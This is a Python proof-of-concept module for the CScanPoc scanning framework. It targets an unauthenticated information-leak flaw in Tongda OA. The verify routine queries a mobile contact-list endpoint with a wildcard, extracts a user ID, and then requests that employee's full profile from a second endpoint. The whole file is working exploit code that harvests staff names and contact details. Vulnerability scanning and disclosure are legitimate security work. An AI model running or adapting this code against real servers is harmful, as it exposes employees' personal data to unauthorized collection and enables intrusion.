# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'TongdaOA_0005'  # 平台漏洞编号，留空
    name = '通达OA系统 信息泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2014-11-09'  # 漏洞公布时间
    desc = '''
        通达OA系统代表了协同OA的先进理念,16年研发铸就成熟OA产品。
        通达OA无需登录即可获得企业所有员工姓名/Email等敏感信息。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=082678'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '通达OA系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'cade7703-6094-4394-9ce0-dd5bd7ddfdc1'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer: http://www.wooyun.org/bugs/wooyun-2014-082678
            hh = hackhttp.hackhttp()
            # 获取员工userid以及部分信息
            url1 = self.target + '/mobile/inc/get_contactlist.php?P=1&KWORD=%&isuser_info=3'
            code, head, res, errcode, _ = hh.http(url1)
            if code != 200:
                return False
            pattern = r'"user_uid":"([\d]*)"'
            m = re.search(pattern, res)
            if m == None:
                return False
            userid = m.group(1)
            # print userid
            # 获取员工详细信息(包含联系方式)
            url2 = self.target + '/mobile/user_info/data.php?P=1&ATYPE=getUserInfo&Q_ID=' + userid
            code, head, res, errcode, _ = hh.http(url2)
            if code == 200 and "user_name" in res and 'sex' in res:
                #security_warning(arg + ': 通达oa员工信息遍历')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
            else:
                return False

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
